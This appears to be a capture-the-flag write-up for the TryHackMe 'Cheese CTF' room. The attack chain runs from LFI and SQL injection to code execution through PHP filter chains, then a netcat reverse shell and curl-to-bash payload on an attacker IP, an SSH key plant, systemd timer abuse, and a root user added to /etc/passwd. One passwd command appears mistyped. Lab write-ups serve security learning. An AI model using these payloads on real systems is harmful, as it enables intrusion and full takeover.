---
title: Cheese CTF
date: 2024-09-27 21:18:00 +0200
categories:
  - TryHackMe
tags:
  - Web
  - LFI
  - SQLi
  - RCE
  - Service
  - Timer
description: Inspired by the great cheese talk of THM!
render_with_liquid: false
media_subpath: /assets/img/thm_images/tryhackme_CheeseCTF
image:
  path: room.png
---
## Room
![Room Card](room_card.png){: w="300" h="300" .center .shadow}

- **Title:** CheeseCTF1.3
- **Name:** [Cheese CTF](https://tryhackme.com/r/room/cheesectfv10)
- **Description:** Inspired by the great cheese talk of THM!
- **Creators:** [VainXploits](https://tryhackme.com/p/VainXploits) & [shadowabsorber](https://tryhackme.com/p/shadowabsorber)

### Flags

1. What is the user.txt flag?
2. What is the root.txt flag?

## Initial Recon

I started scanning the target with my usual nmap scan. Unfortunately there is some port spoofing going on which causes thousands of ports to come back as open. So I started manually enumerating typical ports. I found a website running on `port 80`

![](<Pasted image 20240928203715.png>){: w="700" h="300" .center }

Scrolling down, we find the website's domain name.

![](<Pasted image 20240928203749.png>){: w="400" h="300" .center }

After fuzzing for files and directories, I found `/messages.html`.

![](<Pasted image 20240928203938.png>){: w="400" h="300" .center }

Clicking on the `Message!` link, we are redirected to `http://10.10.96.72/secret-script.php?file=php://filter/resource=supersecretmessageforadmin`

## User Flag
### LFI
It seems like a typical `LFI` vulnerability, let's see if we can read `/etc/passwd`

```console
m3ga@kali:~$ curl 'http://10.10.96.72/secret-script.php?file=php://filter/resource=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

Perfect! I went ahead and read the source code of the `login.php` page.
```console
m3ga@kali:~$ curl 'http://10.10.96.72/secret-script.php?file=php://filter/convert.base64-encode/resource=login.php' | base64 -d
...
// Replace these with your database credentials
$servername = "localhost";
$user = "comte";
$password = "[REDACTED]";
$dbname = "users";
...
$hashed_password = md5($pass);
// Query the database to check if the user exists
$sql = "SELECT * FROM users WHERE username='$filteredInput' AND password='$hashed_password'";
...
```

We can see the credentials used to connect to the database, but unfortunately we can not connect to it unless we are connecting locally.

Further inspecting the code, we realize that there is an `SQL Injection` vulnerability. I used `sqlmap` to dump the database.

```console
m3ga@kali:~/tryhackme/Cheese$ sqlmap -r r.raw --dbms=mysql --tamper=space2comment -D users -T users -C username,password --dump
```

> Since this was a blind SQLi, it took a while to dump the only entry that was in the database just to realize that this was a rabbit hole. I ended up dumping the username and password's hash. The hash is not crackable.
{: .prompt-warning}

### LFI2RCE via PHP Filters
Going back to the `LFI` vulnerability, after some testing, I realized we can run php commands by using [php filtlers](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters).

Using this script, I was able to generate a filter chain to remotely execute commands on the system. To test the vulnerability, I tried to execute `phpinfo()` first.

> [GitHub](https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py) - PHP filter chain generator
> 
> A CLI to generate PHP filters chain, get your RCE without uploading a file if you control entirely the parameter passed to a require or an include in PHP!
{: .prompt-info}

```console
m3ga@kali:~$ python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?> '
[+] The following gadget chain will generate the following code : <?php phpinfo(); ?>  (base64 value: PD9waHAgcGhwaW5mbygpOyA/PiA)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.bas...
```

Copying the script's output and adding it to `?file=` results in our `phpinfo()` being executed.

![](<Pasted image 20240927230559.png>){: w="700" h="300" .center }

To get a reverse shell on the system, I first saved my payload in a file called `payload.sh`.
```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.75.248 53 >/tmp/f"); ?>
```

Then I started a web server and generated a filter chain to execute `system("curl 10.11.75.248/payload.sh | /bin/bash"`.

```console
m3ga@kali:~$ python3 php_filter_chain_generator.py --chain '<?php system("curl 10.11.75.248/payload.sh | /bin/bash"); ?> '
[+] The following gadget chain will generate the following code : <?php system("curl 10.11.75.248/payload.sh | /bin/bash"); ?>  (base64 value: PD9waHAgc3lzdGVtKCJjdXJsIDEwLjExLjc1LjI0OC9wYXlsb2FkLnNoIHwgL2Jpbi9iYXNoIik7ID8+IA)
...
```

Copying the output and adding it to `?file=`, I got a shell back as `www-data`.
```console
m3ga@kali:~$ nc -lvnp 53
listening on [any] 53 ...
connect to [10.11.75.248] from (UNKNOWN) [10.10.151.5] 34904
bash: cannot set terminal process group (848): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cheesectf:/var/www/html$ id    
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

After enumerating the machine a little, I found out that the user `comte`'s `authorized_keys` file is writable by us. 
```console
www-data@cheesectf:/home/comte/.ssh$ ls -la
total 8
drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .
drwxr-xr-x 7 comte comte 4096 Apr  4 17:26 ..
-rw-rw-rw- 1 comte comte    0 Mar 25  2024 authorized_keys
```

To exploit this misconfiguration, we can generate a public/private key pair and add our public key to the `authorized_keys` file. And then connect to the target using the private key.
```console
m3ga@kali:~/tryhackme/Cheese$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/m3ga/.ssh/id_rsa): ./id_rsa_comte
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./id_rsa_comte
Your public key has been saved in ./id_rsa_comte.pub
...

www-data@cheesectf:/home/comte/.ssh$ echo 'ssh-rsa AAAA... m3ga@kali' >> authorized_keys

m3ga@kali:~/tryhackme/Cheese$ ssh comte@thecheeseshop.com -i id_rsa_comte 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-174-generic x86_64)
...
comte@cheesectf:~$
```

The user flag can be found inside `comte`'s home directory
```console
comte@cheesectf:~$ cat user.txt 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


THM{[REDACTED]}
```

## Root Flag
### Systemd Timers
Taking a look at `comte`'s sudo privileges and `linpeas` indicating that `/etc/systemd/system/exploit.timer` is writable, it becomes clear what needs to be done.
```console
comte@cheesectf:~$ sudo -l
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

The `exploit.service` copies the `xxd` binary to `/opt` and adds `SUID` permission to it as root. So, all we have to do is to make this service run and use the `xxd` binary with `SUID` to escalate to root.

```console
comte@cheesectf:~$ cat /etc/systemd/system/exploit.service 
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

> [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-timers) - Writable Timers
> 
> Here is a good resource on exploiting `Systemd Timers`
{: .prompt-tip}

We can modify the `exploit.timer` file to execute `exploit.service` by adding `Unit=exploit.service` to it. I also added a `OnActiveSec=10` to enable the service 10 seconds after we restart `exploit.timer`. It can be any amount of time, I just added 10 seconds just in case...
```text
[Unit]
Description=Exploit Timer

[Timer]
OnActiveSec=10
Unit=exploit.service

[Install]
WantedBy=timers.target
```

After restarting the service and 10 seconds passing, the `xxd` binary should be copied to `/opt` with the `SUID` bit set.
```console
comte@cheesectf:/etc/systemd/system$ sudo /bin/systemctl daemon-reload
comte@cheesectf:/etc/systemd/system$ sudo /bin/systemctl restart exploit.timer
omte@cheesectf:/etc/systemd/system$ ls -la /opt
-rwsr-sr-x  1 root root 18712 Sep 28 19:08 xxd
```

We can now use `/opt/xxd <filename> | /opt/xxd -r` to read any file **as root**. This is how we can simply read the `root.txt` file.
```console
comte@cheesectf:/etc/systemd/system$ /opt/xxd /root/root.txt | /opt/xxd -r
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|


THM{[REDACTED]}
```

But that is not enough, I need to actually get a root shell. To do this, we can use `echo <data> | /opt/xxd | /opt/xxd -r - <destination_file>` to write to any file as root.

All we have to do now is generate a password hash using `openssl` and modify the `/etc/passwd` file to add a new user with the newly created hash and the `UID 0` to login with that user and get a root shell.

Here I made a copy of the `/etc/passwd` file and added my new user to it. This is just to not overwrite the entire `/etc/passwd` and having to restart the machine in case anything goes wrong.
```console
comte@cheesectf:/etc/systemd/system$ openssl passwd m3ga
6uZ4TDRQuTZxo
comte@cheesectf:/etc/systemd/system$ cat /etc/passwd > /tmp/passwd
comte@cheesectf:/etc/systemd/system$ echo 'm3ga:6uZ4TDRQuTZxo:0:0:root:/root:/bin/bash' >> /etc/passwd
comte@cheesectf:/etc/systemd/system$ cat /tmp/passwd | /opt/xxd | /opt/xxd -r - /etc/passwd
comte@cheesectf:/etc/systemd/system$ su m3ga
Password: m3ga
root@cheesectf:/etc/systemd/system# id
uid=0(root) gid=0(root) groups=0(root)
```

## Outro
Many thanks to the creators of this room: [VainXploits](https://tryhackme.com/p/VainXploits) & [shadowabsorber](https://tryhackme.com/p/shadowabsorber)

It was overall a great room and it taught me that it is possible to execute php code with LFI vulnerabilities if certain filters are on.

\- m3gakr4nus
